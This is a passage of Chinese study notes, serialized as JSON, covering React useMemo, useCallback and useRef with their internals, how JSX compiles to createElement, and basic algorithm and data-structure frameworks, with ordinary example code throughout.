是否支持写\n\t- Vue computed 支持 `getter/setter`\n\t- React useMemo 只支持 getter\n- 使用方式\n\t- Vue computed 返回响应式引用（需要 `.value`）\n\t- React useMemo 直接返回值\n- 集成度：\n\t- Vue computed 与 其他组合式 API 紧密集成\n\t- React useMemo 相对独立\n- 副作用：\n\t- 副作用使用 `watch/watchEffect`\n\t- 副作用使用 `useEffect`，然后修改状态值，再将状态值作为 `useMemo` 的依赖项\n- 计算时机\n\t- vue **只有依赖变化时重新计算**\n\t- react **每次渲染都会检查依赖数组**，依赖未变化时使用缓存值\n\n==编程范式不同：==\n- Vue 的组合式 API 中的 computed 更符合`响应式编程范式`\n- 而 React 的 useMemo 则更符合`函数式编程思维`。\n\n## 7. 与 useCallback 的区别\n\n实际上，`useCallback` 是 `useMemo` 的特殊用例：\n\n```javascript\n// useCallback 的实现原理等同于：\nconst callback = useCallback(fn, deps);\n// 等价于，返回一个函数\nconst callback = useMemo(() => fn, deps);\n```\n\n### 7.1. 性能优化场景\n\n#### 7.1.1. useMemo - 昂贵计算的优化\n\n```jsx\n// useMemo - 昂贵计算的优化\nfunction DataGrid({ data, config }) {\n  // 复杂数据处理的结果缓存\n  const processedData = useMemo(() => {\n    return data.map(item => ({\n      ...item,\n      processed: expensiveOperation(item, config)\n    }));\n  }, [data, config]);\n\n  return <Table data={processedData} />;\n}\n\n\n```\n\n#### 7.1.2. useCallback - 防止子组件重渲染\n\n如下，`<TodoInput onAdd={handleAddTodo} /> ` 中 `handleAddTodo` 变化会导致重新渲染\n\n```javascript hl:12\n// useCallback - 防止子组件重渲染\nfunction TodoList() {\n  const [todos, setTodos] = useState([]);\n\n  // 缓存添加 todo 的函数\n  const handleAddTodo = useCallback((text) => {\n    setTodos(prev => [...prev, { id: Date.now(), text }]);\n  }, []); // 不依赖任何状态，所以是空数组\n\n  return (\n    <>\n      <TodoInput onAdd={handleAddTodo} /> \n      {/* 子组件使用 React.memo */}\n      <TodoItems items={todos} />\n    </>\n  );\n}\n```\n\n### 7.2. 常见错误用法\n\n```javascript\n// ❌ 错误：不必要的 useMemo\nconst SimpleComponent = ({ name }) => {\n  // 简单的字符串拼接不需要 useMemo\n  const greeting = useMemo(() => `Hello, ${name}!`, [name]);\n  return <div>{greeting}</div>;\n};\n\n// ❌ 错误：不必要的 useCallback\nconst SimpleButton = () => {\n  // 简单组件不需要 useCallback\n  const handleClick = useCallback(() => {\n    console.log('clicked');\n  }, []);\n  return <button onClick={handleClick}>Click me</button>;\n};\n\n// ✅ 正确：有性能影响时使用\nconst ExpensiveComponent = ({ data }) => {\n  // 复杂计算需要缓存\n  const processedData = useMemo(() => {\n    return heavyComputation(data);\n  }, [data]);\n\n  return <div>{processedData}</div>;\n};\n```\n\n### 7.3. 与 React.memo 配合使用\n\n```javascript\n// 子组件使用 React.memo 包裹\nconst ChildComponent = React.memo(({ onClick, data }) => {\n  console.log(\"Child rendered\");\n  return (\n    <button onClick={onClick}>\n      {data.text}\n    </button>\n  );\n});\n\n// 父组件\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n  \n  // 使用 useCallback 缓存函数\n  const handleClick = useCallback(() => {\n    console.log('Button clicked');\n  }, []); // 空依赖数组\n  \n  // 使用 useMemo 缓存数据\n  const data = useMemo(() => ({\n    text: `Current count is ${count}`\n  }), [count]);\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => setCount(count + 1)}>Increment</button>\n      <ChildComponent onClick={handleClick} data={data} />\n    </div>\n  );\n}\n```\n\n### 7.4. 主要区别总结\n\n- 用途：\n\t- useMemo：缓存**函数计算的结果**\n\t- useCallback：缓存**函数引用**\n- 返回值：\n\t- useMemo：返回缓存的**值**\n\t- useCallback：返回缓存的**函数**\n- 使用场景：\n\t- useMemo：\n\t\t- 昂贵的计算操作\n\t\t- 复杂的数据处理\n\t\t- 需要缓存引用的对象\n\t- useCallback：\n\t\t- **传递给子组件的回调函数**\n\t\t- 防止不必要的重渲染\n\t\t- 需要保持**函数引用稳定**的场景\n- 性能考虑：\n\t- 不是所有值都需要 useMemo\n\t- 不是所有函数都需要 useCallback\n\t- 应该在实际遇到性能问题时才使用\n\n### 7.5. 使用建议\n\n1. 优先考虑代码的可读性和维护性，而不是过早优化\n\t1. **过早优化是万恶之源**\n2. 在以下情况使用 useMemo：\n\t- 计算成本高的操作\n\t- 需要保持引用相等的对象\n3. 在以下情况使用 `useCallback`：\n\t- **传递给使用 React.memo 的子组件的函数**\n\t- 函数作为其他 Hook 的依赖项\n4. 避免过度使用：\n\t- 简单的计算不需要 `useMemo`\n\t- 简单的事件处理函数不需要 `useCallback`\n5. 结合 React.memo 使用可以获得**最佳性能优化效果**\n\n## 8. useCallback 的常见使用场景\n\n### 8.1. 防止子组件重复渲染（最常见场景）\n\n```javascript hl:1,12,31,18\n// 子组件\nconst ExpensiveChild = React.memo(({ onItemClick }) => {\n  // 通过这个日志观察渲染情况\n  console.log(\"Child render\"); \n  return (\n    <div>\n      <button onClick={() => onItemClick(1)}>Click me</button>\n    </div>\n  );\n});\n\n// 父组件\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  const [otherState, setOtherState] = useState(false);\n\n  // ✅ 使用 useCallback 缓存回调函数\n  const handleItemClick = useCallback((id) => {\n    console.log('Item clicked:', id);\n    // 一些复杂的操作\n  }, []); // 空依赖数组因为这个函数不依赖任何 props 或 state\n\n  return (\n    <div>\n      <button onClick={() => setCount(count + 1)}>\n        Count: {count}\n      </button>\n      <button onClick={() => setOtherState(!otherState)}>\n        Toggle: {otherState.toString()}\n      </button>\n      <ExpensiveChild onItemClick={handleItemClick} />\n    </div>\n  );\n}\n```\n\n### 8.2. 在 useEffect 中使用的函数\n\n- query 和 handleSearch 变化时，触发请求\n\t- query 变化好理解\n\t- handleSearch 变化，意味着 searchType 变化了\n\t\t- 所以 searchType 变化，导致 handleSearch变化，导致副作业触发（请求触发）\n\n```javascript hl:23\nfunction SearchComponent({ searchType }) {\n  const [results, setResults] = useState([]);\n  const [query, setQuery] = useState('');\n\n  // ✅ 缓存搜索函数，避免 useEffect 不必要的触发\n  const handleSearch = useCallback(async (searchText) => {\n    try {\n      const response = await fetch(\n        `/api/search?type=${searchType}&q=${searchText}`\n      );\n      const data = await response.json();\n      setResults(data);\n    } catch (error) {\n      console.error('Search failed:', error);\n    }\n  }, [searchType]); // 只依赖 searchType\n\n  // 现在 useEffect 只会在 query 或 handleSearch 变化时执行\n  useEffect(() => {\n    if (query) {\n      handleSearch(query);\n    }\n  }, [query, handleSearch]); \n\n\n\n  return (\n    <div>\n      <input\n        value={query}\n        onChange={(e) => setQuery(e.target.value)}\n        placeholder=\"Search...\"\n      />\n      <ul>\n        {results.map(item => (\n          <li key={item.id}>{item.name}</li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n```\n\n### 8.3. 事件监听器的处理\n\n> 传入空数组，说明是组件挂载时，只执行一次，后面都是取缓存值\n\n```javascript hl:13,18\nfunction WindowResizeHandler() {\n  const [windowSize, setWindowSize] = useState({\n    width: window.innerWidth,\n    height: window.innerHeight\n  });\n\n  // ✅ 缓存 resize 处理函数\n  const handleResize = useCallback(() => {\n    setWindowSize({\n      width: window.innerWidth,\n      height: window.innerHeight\n    });\n  }, []); // 不依赖任何变量\n\n  useEffect(() => {\n    window.addEventListener('resize', handleResize);\n    return () => window.removeEventListener('resize', handleResize);\n  }, [handleResize]); // 依赖 handleResize\n\n  return (\n    <div>\n      Window size: {windowSize.width} x {windowSize.height}\n    </div>\n  );\n}\n```\n\n### 8.4. 在自定义 Hook 中返回函数\n\n```javascript\n// 自定义 Hook\nfunction useFormField(initialValue = '') {\n  const [value, setValue] = useState(initialValue);\n  const [error, setError] = useState('');\n\n  // ✅ 缓存验证和更新函数\n  const handleChange = useCallback((e) => {\n    const newValue = e.target.value;\n    setValue(newValue);\n    \n    // 验证逻辑\n    if (newValue.length < 3) {\n      setError('Value must be at least 3 characters');\n    } else {\n      setError('');\n    }\n  }, []); // 不依赖外部变量\n\n  const reset = useCallback(() => {\n    setValue(initialValue);\n    setError('');\n  }, [initialValue]);\n\n  return {\n    value,\n    error,\n    handleChange,\n    reset\n  };\n}\n\n```\n\n使用自定义 Hook：useFormField\n\n```javascript hl:3,4\n// 使用自定义 Hook\nfunction Form() {\n  const username = useFormField('');\n  const password = useFormField('');\n\n  return (\n    <form>\n      <div>\n        <input\n          value={username.value}\n          onChange={username.handleChange}\n          placeholder=\"Username\"\n        />\n        {username.error && <span>{username.error}</span>}\n      </div>\n      <div>\n        <input\n          type=\"password\"\n          value={password.value}\n          onChange={password.handleChange}\n          placeholder=\"Password\"\n        />\n        {password.error && <span>{password.error}</span>}\n      </div>\n      <button type=\"button\" onClick={() => {\n        username.reset();\n        password.reset();\n      }}>\n        Reset\n      </button>\n    </form>\n  );\n}\n```\n\n### 8.5. 处理防抖/节流函数\n\n> 空依赖数组，因为这个函数不需要重新创建\n\n```javascript\nfunction SearchInput() {\n  const [searchTerm, setSearchTerm] = useState('');\n  const [results, setResults] = useState([]);\n\n  // ✅ 缓存防抖搜索函数\n  const debouncedSearch = useCallback(\n    debounce(async (term) => {\n      if (term) {\n        const response = await fetch(`/api/search?q=${term}`);\n        const data = await response.json();\n        setResults(data);\n      } else {\n        setResults([]);\n      }\n    }, 500),\n    [] // 空依赖数组，因为这个函数不需要重新创建\n  );\n\n  // ✅ 缓存输入处理函数\n  const handleInputChange = useCallback((e) => {\n    const value = e.target.value;\n    setSearchTerm(value);\n    debouncedSearch(value);\n  }, [debouncedSearch]);\n\n  return (\n    <div>\n      <input\n        type=\"text\"\n        value={searchTerm}\n        onChange={handleInputChange}\n        placeholder=\"Search...\"\n      />\n      <ul>\n        {results.map(result => (\n          <li key={result.id}>{result.title}</li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n```\n\n### 8.6. 复杂表单处理\n\n```javascript\nfunction ComplexForm() {\n  const [formData, setFormData] = useState({});\n  const [errors, setErrors] = useState({});\n\n  // ✅ 缓存字段验证函数\n  const validateField = useCallback((name, value) => {\n    let error = '';\n    switch (name) {\n      case 'email':\n        if (!value.includes('@')) {\n          error = 'Invalid email address';\n        }\n        break;\n      case 'password':\n        if (value.length < 6) {\n          error = 'Password must be at least 6 characters';\n        }\n        break;\n      // 更多验证规则...\n    }\n    return error;\n  }, []);\n\n  // ✅ 缓存字段更新处理函数\n  const handleFieldChange = useCallback((e) => {\n    const { name, value } = e.target;\n    setFormData(prev => ({\n      ...prev,\n      [name]: value\n    }));\n\n    const error = validateField(name, value);\n    setErrors(prev => ({\n      ...prev,\n      [name]: error\n    }));\n  }, [validateField]);\n\n  // ✅ 缓存表单提交处理函数\n  const handleSubmit = useCallback(async (e) => {\n    e.preventDefault();\n    const hasErrors = Object.values(errors).some(error => error);\n    if (!hasErrors) {\n      try {\n        await fetch('/api/submit', {\n          method: 'POST',\n          body: JSON.stringify(formData)\n        });\n        // 处理成功\n      } catch (error) {\n        // 处理错误\n      }\n    }\n  }, [formData, errors]);\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <div>\n        <input\n          name=\"email\"\n          onChange={handleFieldChange}\n          value={formData.email || ''}\n        />\n        {errors.email && <span>{errors.email}</span>}\n      </div>\n      <div>\n        <input\n          name=\"password\"\n          type=\"password\"\n          onChange={handleFieldChange}\n          value={formData.password || ''}\n        />\n        {errors.password && <span>{errors.password}</span>}\n      </div>\n      <button type=\"submit\">Submit</button>\n    </form>\n  );\n}\n```\n\n### 8.7. 使用建议\n\n- 优先考虑以下场景使用 useCallback：\n\t- 传递给使用 `React.memo()` 的子组件的函数\n\t- 作为 `useEffect` 的依赖项的函数\n\t- 在自定义 Hook 中返回的函数\n\t- 需要稳定引用的事件处理函数\n- 避免过度使用：\n\t- 简单的内联事件处理器不需要 useCallback\n\t- 组件内部使用的函数通常不需要 useCallback\n\t- 只渲染一次的组件不需要 useCallback\n- 性能优化原则：\n\t- **先测量，后优化**\n\t- 使用 React DevTools Profiler 检测性能问题\n\t- 关注实际用户体验而不是理论优化\n- 结合其他优化技术：\n\t- 配合 React.memo 使用\n\t- 考虑使用 useMemo 缓存计算结果\n\t- 适当使用状态提升和组件拆分\n","xynZpAfl":"\n# useRef、forwardRef 的用法及实现原理\n\n`#React` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useRef 的作用\n\t- 获取 DOM 引用\n\t- 用户获取最新数据\n\t- 不会导致重新渲染\n\t- `.current`\n\t- 可以用来存储定时器，方便 `clear`\n- useRef vs useState 的区别：\n\t- 是否会导致重新渲染\n- **React 不允许组件访问其他组件的 DOM 节点，甚至自己的子组件也不行**\n\t- 但可使用 `forwardRef` 包装和可以，然后再配合 `useRef`\n- useRef 的实现原理\n\t- 本质上是维护了**一个包含 `current` 属性的对象**，这个对象**在组件的整个生命周期中保持不变**\n\n## 2. useRef \n\n### 2.1. useRef 的作用\n\n- 获取 DOM 引用\n- 创建元素对象，只要函数组件未被销毁，原始对象就一直存在，故可以用它来`保存数据`\n- 保存前一次的值\n- 记得都存在 `.current` 里，有点类似于 vue 的 `.value`\n\t- 即`let domRef = useRef()` 始终是同一个对象引用，只有 `ref.current` 可以改变\n- 可以用来存储定时器，方便 `clear`\n- 缓存不需要触发重新染的值\n- 同样，只能在顶层使用\n\n### 2.2. 注意点\n\n- 不要在渲染时，修改 ref\n- 不要过度使用，需要区分哪些使用 `state` 来管理\n\n### 2.3. useRef vs useState 的区别\n\n区别在于**是否会触发重现渲染**\n\n```javascript hl:10\nfunction ComparisonExample() {\n  const [stateCount, setStateCount] = useState(0);\n  const refCount = useRef(0);\n  \n  const updateState = () => {\n    setStateCount(stateCount + 1); // 触发重渲染\n  };\n  \n  const updateRef = () => {\n    refCount.current += 1; // 不会触发重渲染\n    console.log('ref count:', refCount.current);\n  };\n  \n  return (\n    <>\n      <p>State count: {stateCount}</p>\n      <p>Ref count: {refCount.current}</p>\n      <button onClick={updateState}>Update State</button>\n      <button onClick={updateRef}>Update Ref</button>\n    </>\n  );\n}\n\n```\n\n## 3. forwardRef 与 useRef 配合使用\n\n**React 不允许组件访问其他组件的 DOM 节点**。甚至自己的子组件也不行，使用 `forwardRef` 可以\n\n```javascript hl:3,19\nimport { forwardRef, useRef } from 'react';\n\n// 子组件使用 forwardRef \nconst MyInput = forwardRef((props, ref) => {\n  return <input {...props} ref={ref} />;\n});\n\n\n// 父组件\nexport default function Form() {\n  const inputRef = useRef(null);\n\n  function handleClick() {\n    inputRef.current.focus();\n  }\n\n  return (\n    <>\n      <MyInput ref={inputRef} />\n      <button onClick={handleClick}>\n        聚焦输入框\n      </button>\n    </>\n  );\n}\n```\n\n## 4. useRef 用于性能优化\n\n```javascript hl:7\nfunction SearchResults() {\n  const [query, setQuery] = useState('');\n  const lastQuery = useRef('');\n  \n  useEffect(() => {\n    // 只有当查询真正改变时才发起请求\n    if (query !== lastQuery.current) {\n      lastQuery.current = query;\n      // 发起搜索请求\n      fetchSearchResults(query);\n    }\n  }, [query]);\n  \n  return (\n    // ...\n  );\n}\n```\n\n## 5. useRef 的实现原理\n\n本质上是维护了**一个包含 `current` 属性的对象**，这个对象**在组件的整个生命周期中保持不变**。\n\n### 5.1. 数据结构\n\n```typescript hl:2,10\ntype Hook = {\n  memoizedState: any; // 保存 ref 对象\n  next: Hook | null; // 指向下一个 Hook\n  queue: UpdateQueue<any> | null; // 更新队列\n  baseState: any; // 基础状态\n  baseQueue: Update<any> | null; // 基础更新队列\n};\n\n// ref 对象的结构\ntype RefObject = {\n  current: any;\n};\n\ntype Fiber = {\n  // ...其他属性\n  memoizedState: Hook | null; // 指向第一个 Hook\n  updateQueue: mixed;\n  stateNode: any;\n};\n\n```\n\n### 5.2. 在 Fiber 中的存储\n\n```typescript\ntype Fiber = {\n  // ...其他属性\n  memoizedState: Hook | null,  // 指向第一个 Hook\n  updateQueue: mixed,\n  stateNode: any,\n};\n\n// Hook 链表结构示意\nfunction Component() {\n  const ref1 = useRef(null);    // Hook1\n  const ref2 = useRef(null);    // Hook2\n  const [state, setState] = useState(null);  // Hook3\n  \n  // Hooks 在 Fiber 中形成链表\n  // Fiber.memoizedState -> Hook1 -> Hook2 -> Hook3\n}\n\n```\n\n### 5.3. 初始阶段\n\n```typescript hl:2,20\nfunction createRef(initialValue) {\n  const refObject = {\n    current: initialValue,\n  };\n\n  // 在开发环境下，添加一些额外属性\n  if (__DEV__) {\n    Object.seal(refObject);\n  }\n\n  return refObject;\n}\n\n// 在组件首次渲染时\nfunction mountRef(initialValue) {\n  // 1. 创建 hook 对象\n  const hook = mountWorkInProgressHook();\n\n  // 2. 创建 ref 对象\n  const ref = createRef(initialValue);\n\n  // 3. 将 ref 对象存储在 hook 的 memoizedState 中\n  hook.memoizedState = ref;\n\n  return ref;\n}\n```\n\n### 5.4. 更新阶段\n\n```typescript\nfunction updateRef(initialValue) {\n  // 1. 获取当前的 hook\n  const hook = updateWorkInProgressHook();\n  \n  // 2. 直接返回之前存储的 ref 对象\n  // 注意：不会创建新的 ref 对象\n  return hook.memoizedState;\n}\n\n```\n\n","tUd6T3fh":"\n# 深入理解 JSX\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n1. JSX 是一种语法糖，最终会被转换为 `React.createElement()` 调用\n2. 转换过程通过 `Babel` 等工具完成，包含==词法分析、语法分析和代码生成==\n3. `createElement` 函数创建虚拟 DOM 对象\n4. 虚拟 DOM 对象描述了真实 DOM 的结构\n5. React 使用**虚拟 DOM** 进行高效的 DOM 更新\n6. 对于 Vue 来说，转成对应的 `h 函数` 调用\n\n## 2. JSX 的本质\n\nJSX 本质上是一个语法糖，它会被编译工具（通常是 Babel）转换为普通的 JavaScript 函数调用\n\n### 2.1. 编译转换过程\n\n```jsx\n// 原始 JSX 代码\nconst element = (\n  <div className=\"container\">\n    <h1>Hello, World!</h1>\n  </div>\n);\n\n// 经过 Babel 转换后的代码\nconst element = React.createElement(\n  'div',\n  { className: 'container' },\n  React.createElement('h1', null, 'Hello, World!')\n);\n```\n\n## 3. React.createElement 的工作原理\n\n### 3.1. createElement 函数的基本结构\n\n```javascript\nReact.createElement(type, props, ...children)\n```\n\n参数说明：\n- `type`: 元素类型（字符串 或 React 组件）\n- `props`: 属性对象\n- `children`: 子元素\n\n### 3.2. createElement 的简化实现\n\n```javascript\nfunction createElement(type, props, ...children) {\n  return {\n    type,\n    props: {\n      ...props,\n      children: children.map(child =>\n        typeof child === 'object' ? child : createTextElement(child)\n      )\n    }\n  };\n}\n\nfunction createTextElement(text) {\n  return {\n    type: 'TEXT_ELEMENT',\n    props: {\n      nodeValue: text,\n      children: []\n    }\n  };\n}\n```\n\n## 4. 虚拟 DOM 的生成\n\n`createElement 函数`返回的对象就是虚拟 DOM（Virtual DOM）节点，它的基本结构如下：\n\n```javascript\n{\n  type: 'div',\n  props: {\n    className: 'container',\n    children: [\n      {\n        type: 'h1',\n        props: {\n          children: [\n            {\n              type: 'TEXT_ELEMENT',\n              props: {\n                nodeValue: 'Hello, World!',\n                children: []\n              }\n            }\n          ]\n        }\n      }\n    ]\n  }\n}\n```\n\n## 5. JSX 的编译过程\n\n### 5.1. 词法分析（Lexical Analysis）\n\n将 JSX 代码分解成一个个 token。\n\n### 5.2. 语法分析（Syntactic Analysis）\n\n将 token 转换成 AST（抽象语法树）。\n\n### 5.3. 代码生成（Code Generation）\n\n将 AST 转换成最终的 JavaScript 代码。\n\n## 6. Babel 转换示例\n\n```jsx\n// JSX 代码\nfunction App() {\n  return (\n    <div>\n      <h1 className=\"title\">{message}</h1>\n      <button onClick={handleClick}>Click me</button>\n    </div>\n  );\n}\n\n// 转换后的代码\nfunction App() {\n  return React.createElement(\n    \"div\",\n    null,\n    React.createElement(\n      \"h1\",\n      { className: \"title\" },\n      message\n    ),\n    React.createElement(\n      \"button\",\n      { onClick: handleClick },\n      \"Click me\"\n    )\n  );\n}\n```\n\n## 7. JSX 的特殊处理\n\n### 7.1. 条件渲染的处理\n\n```jsx\n// JSX 中的条件渲染\n{condition && <div>Conditional Content</div>}\n\n// 转换后\ncondition ? React.createElement(\"div\", null, \"Conditional Content\") : null\n```\n\n### 7.2. 列表渲染的处理\n\n```jsx\n// JSX 中的列表渲染\n{items.map(item => <li key={item.id}>{item.text}</li>)}\n\n// 转换后\nitems.map(item => \n  React.createElement(\"li\", { key: item.id }, item.text)\n)\n```\n\n\n","Giei5JpV":"\n# 前言\n\n\n> 算法、数据结构、及 LeetCode 刷题\n\n","BuihSt0M":"\n# 算法核心框架\n\n\n\n## 目录\n<!-- toc -->\n ## 一句话总结 \n\n- 数据结构基础的就两种\n\t- 数组：顺序储存\n\t- 链表：链式存储\n- 两种数据结构只做两件事情，或者说只做增删查改\n\t- 遍历\n\t- 访问\n- 一起算法的本质是**穷举**\n\n## 本文画板\n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/计算机算法框架思维.jpg)\n\n## 数据结构的存储方式就两种：数组和链表\n\n- 哈希表\n\t- 拉链法：链表\n\t- 线性探测法：数组\n- 栈和队列\n\t- 都可使用链表和数组来实现\n- 堆\n\t- 使用数组实现，因为是完全二叉树\n- 树\n\t- 完全二叉树，适合使用数组来存储\n\t- 非完全二叉树，适合使用链表存储\n- 图\n\t- 邻接表：链表\n\t- 邻接矩阵：二维数组\n\n## 所有数据结构的操作，只有访问+遍历（增删改查）\n\n- 再拆解，遍历+访问只有两种形式\n\t- 线性的： for/while\n\t\t- 数组遍历\n\t\t- 链表遍历：同时具备线性和非线性的遍历方式\n\t- 非线性的：即递归\n\t\t- 链表遍历：同时具备线性和非线性的遍历方式\n\t\t- 二叉树的遍历是非线性的\n\t\t- 多叉树的遍历是非线性的\n\t\t- 图的遍历也是非线性的\n\n以下是代码示例：\n\n### 线性：数组的遍历框架\n\n```javascript\n/*****************************************\n * 线性：数组的遍历框架\n *****************************************/\nfunction traverse(arr) {\n  for (let i = 0; i < arr.length; i++) {\n    // 对当前元素进行操作\n    console.log(arr[i]);\n  }\n}\n```\n\n### 线性：链表的遍历框架（记得使用 p 变量）\n\n```javascript hl:10,17,22\n/*****************************************\n * 线性：链表的遍历框架（记得使用 p 变量）\n *****************************************/\nclass ListNode {\n  constructor(val) {\n    this.val = val;\n    this.next = null;\n  }\n}\n// 使用 for 循环\nfunction traverse(node) {\n  for (let p = node; p !== null; p = p.next) {\n    // 对当前节点进行操作\n    console.log(p.val);\n  }\n}\n// 使用 while 循环\nfunction traverse(node) {\n  let p = node;\n  while (p !== null) {\n    // 对当前节点进行操作\n    // 有点类似于 前序位置\n    console.log(p.val);\n    p = p.next;\n  }\n}\n\n```\n\n### 非线性（递归）：链表的遍历框架\n\n```javascript\n/*****************************************\n * 非线性（递归）：链表的遍历框架\n *****************************************/\nclass ListNode {\n  constructor(val) {\n    this.val = val;\n    this.next = null;\n  }\n}\n// 递归遍历链表\nfunction traverse(node) {\n  if (node === null) return;\n  console.log(node.val);\n  traverse(node.next);\n}\n\n```\n\n### 非线性（递归）：二叉树的遍历框架\n\n```js\n/*****************************************\n * 非线性（递归）：二叉树的遍历框架\n *****************************************/\nclass TreeNode {\n  constructor(val) {\n    this.val = val;\n    this.left = this.right = null;\n  }\n}\n// 递归遍历链表\nfunction traverse(node) {\n  if (node === null) {\n    return;\n  }\n  // 前序遍历\n  traverse(node.left);\n  // 中序遍历\n  traverse(node.right);\n  // 后序遍历\n}\n\n```\n\n### 非线性（递归）：多叉树的遍历框架\n\n```js\n/*****************************************\n * 非线性（递归）：多叉树的遍历框架\n *****************************************/\nclass Node {\n  constructor(value) {\n    this.value = value;\n    this.children = [];\n  }\n}\n// 递归遍历链表\nfunction traverse(node) {\n  if (!node) return;\n  console.log(node.value);\n  //前序位置\n  for (let i = 0; i < node.children.length; i++) {\n    traverse(node.children[i]);\n  }\n  //后序位置\n}\n\n```\n\n### 非线性（递归）：图的遍历框架\n\n`N` 叉树的遍历又可以扩展为图的遍历，因为图就是好几 `N` 叉棵树的结合体。你说图是可能出现环的？这个很好办，用个布尔数组 `visited` 做标记就行了\n\n## 算法的本质是穷举\n\n- 数学算法和计算机算法是有区别的\n\t- 数学算法可以推导出公式\n\t- 但计算机算法不能，别一上来就想着推导出公式，不然必然死翘翘\n- 计算机最牛逼的不就是算的快吗，1s 转几万次，但人脑不行啊，所以才说别想着像计算机一样递归\n- 穷举的两个难点\n\t- 无遗漏\n\t\t- 回溯算法：遍历的思维\n\t\t- 动态规划算法：分解问题思维\n\t\t\t- 为何分解问题的思维？\n\t\t\t\t- 树上只有一片叶子，和剩下的叶子 \n\t\t\t\t\t- 再分解：树上只有一片叶子，和剩下的叶子 \n\t\t\t\t\t\t- 再分解：树上只有一片叶子，和剩下的叶子 \n\t- 如何避免重复的穷举（聪明地穷举）\n\t\t- 备忘录\n\t\t- 空间压缩技巧\n\t\t- 二分\n\t\t- 连通分量技巧？\n\t\t- 贪心等\n\t\t- 双指针\n\t\t\t- 快慢指针\n\t\t- 前缀和\n\t\t- 差分数组\n\n## 二叉树算法：二叉树模型是所有高级算法的基础\n\n- 遍历的思维模式\n- 分解问题的思维模式\n\n\n## 参考\n\n> https://labuladong.online/algo/essential-technique/algorithm-summary/\n","9tpNOyei":"\n# 计算机算法的框架思维\n\n\n`#2024/01/27`  `#算法` `#算法框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 先分清两种算法 \n\n先分清，两种算法，他们是**完全不同的思维**\n\n- 计算机算法\n   - 本质是 **穷举** ，因为计算机就是**快**\n   - 难点\n      - 一些算法的**难点**是**如何”无遗漏“的穷举所有可能**\n      - 一些算法的难点是**如何”聪明“的穷举**\n- 数学算法\n   - 本质是 **数学**\n   - 学数学的 **后遗症**  ， 别想着 能不能推导出一个什么数学公式\n\n## 2. 如何”无遗漏“的穷举所有\n\n如递归类问题，最典型的是动态规划问题，它的**状态转移方程**是**最难**写出来的\n\n## 3. 技巧：如何”聪明“的穷举\n\n至少  二分查找、快慢指针、左右指针、滑动窗口、前缀和数组、差分数组，这些你得知道\n\n### 3.1. 数组链表技巧\n\n- 双指针**技巧**\n\t- 快慢指针**技巧**\n\t- 前后指针**技巧**\n- 二分搜索**技巧**\n- 前缀和**技巧**\n- 差分数组**技巧**\n\n如下图：\n\n![|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/10ee0eeaec12dd9492b1239016f1a879.png)\n\n### 3.2. 二叉树技巧\n\n#### 3.2.1. 两种思路\n\n- 遍历的思路\n- 分解问题的思路\n\n ![|584](https://832-1310531898.cos.ap-beijing.myqcloud.com/0aeb39bf2040492719a58c0d0869c9ba.png)\n\n#### 3.2.2. 前序遍历的 **遍历思路** 和 **分解问题思路**\n\n![|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/6c39cfaaa276e6a1e1ef17f0873ac762.png)\n\n> [!bug]\n是的，避免死磕，难道用锯子去挖石头，因为技巧储备还不够，一切是徒劳，很多属于会者不难。\n\n## 4. 算法与数据结构\n\n- 各种算法像是精美的**拼图**\n- 而数据结构是组成这些拼图的**模块**\n\n### 4.1. 其实底层就两种存储方式：链表 + 数组\n\n- 链表（链式存储）\n\t- 栈、队列：可用 `链表`实现\n\t- 散列表： 可用`链表：拉链法`实现\n\t- 图：可使用 `链表：邻接表`实现\n- 树\n\t- 堆（完全二叉树）\n\t\t- 可使用`数组`实现吗\n\t- 非完全二叉树\n\t\t- 可使用`链表`实现\n- 数组（顺序存储）\n\t- 栈、队列：也可以`数组`实现\n\t- 散列表： 也可用`数组：线性探测法`实现\n\t- 图：可使用 `数组：邻接矩阵` 实现\n\t- 树\n\t  - 堆（完全二叉树）\n\t\t - 可使用`数组`实现\n\n> [!info]\n 1、上面的对应关系，旨在说明 数据存储 底层就两种存储方式：数组 和 链表\n>  \n>  2、数组和链表才是「结构基础」\n\n### 4.2. 数据结构操作：其实就**遍历 + 访问（增删改查）** 两种\n\n- 两种基本操作\n\t- 遍历 ，遍历又分两种\n\t\t- 线性迭代遍历\n\t\t- 非线性递归遍历\n\t- 访问（增删查改）\n\t\t- 数据结构存在的使命，不就是 尽可能高效的增删查改\n\n#### 4.2.1. 所有的遍历框架\n\n![|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/8e9df48672be419728cc8bb2539d99ee.png)\n","hWXzmFEq":"\n# 基础数据结构\n\n\n`#算法/数据结构`  `#2023/07/30` \n\n\n## 目录\n<!-- toc -->\n ## 一、数据结构的分类 \n\n数据结构可以从`逻辑结构`和`物理结构`两个维度进行分类\n\n### （一）`线性`与`非线性`：按组成数据元素之前的逻辑结构关系分类\n\n即：**数据元素之间的逻辑关系是线性的或者非线性的**， 如\n\n- 数组与链表 是`线性`的\n- 树，体现祖先与后代之间的派生关系，是`非线性`的\n- 图，由节点和边构成，反映了复杂的网络关系，也是`非线性`的\n\n具体分类如下图：\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/6aeacad0d7561d5f2597cbdc70d72f0a.png)\n\n**非线性数据结构**可以进一步被划分为 `树形结构` 和  `网状结构`。\n\n总结：按逻辑结构分类：线性与非线性\n\n> - 线性结构 ：数组、链表、队列、栈、哈希表，元素存在`**一对一**`的顺序关系。\n> - 非线性结构： \n>    - 树形结构 ：树、堆、哈希表，元素存在`**一对多**`的关系。\n>    - 网状结构 ：图，元素存在`**多对多**`的关系。\n\n### （二）连续与离散：按物理结构分类\n\n在数据结构与算法的设计中，算法所占用的`**内存峰值**`不应超过 `**系统剩余空闲内存**`；所以如果运行的程序很多并且缺少大量连续的内存空间，那么所选用的数据结构必须能够存储在**离散的内存空间内**。相反，可以存储到`**连续的内存空间**`\n\n**「物理结构」** 反映了数据在计算机内存中的**存储方式** 